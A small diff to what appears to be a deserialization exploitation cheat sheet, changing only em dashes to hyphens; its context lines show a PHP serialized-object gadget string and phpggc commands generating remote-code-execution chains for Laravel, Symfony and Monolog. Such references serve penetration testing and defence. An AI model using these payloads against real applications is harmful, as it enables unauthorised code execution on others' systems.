@@ -1,4 +1,4 @@
-## Java Deserialization — ysoserial & Exploitation Reference
+## Java Deserialization - ysoserial & Exploitation Reference
 
 ### Detection
 
@@ -185,7 +185,7 @@ print(payload.decode())
 // Generic __destruct / __wakeup gadget
 O:8:"ClassName":1:{s:4:"prop";s:6:"system";}
 
-// phpggc — PHP gadget chain generator
+// phpggc - PHP gadget chain generator
 // phpggc Laravel/RCE1 system id
 // phpggc Symfony/RCE4 exec id
 // phpggc Monolog/RCE1 exec id
